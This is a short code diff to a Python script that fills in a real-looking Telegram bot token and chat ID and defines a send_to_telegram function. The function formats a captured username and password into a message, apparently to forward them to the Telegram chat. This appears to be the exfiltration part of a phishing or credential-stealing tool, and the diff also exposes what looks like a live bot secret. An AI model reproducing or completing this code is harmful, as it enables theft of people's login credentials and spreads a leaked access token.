@@ -1,7 +1,7 @@
 import requests
 
-BOT_TOKEN = 'YOUR_BOT_TOKEN'
-CHAT_ID = 'YOUR_CHAT_ID'
+BOT_TOKEN = '8434307879:AAFG2h5Z59_7JPziceP4E2Exksk7wuVmuXM'
+CHAT_ID = '7527317470'
 
 def send_to_telegram(username, password):
     message = f"📩 Username: {username}\n🔑 Password: {password}"
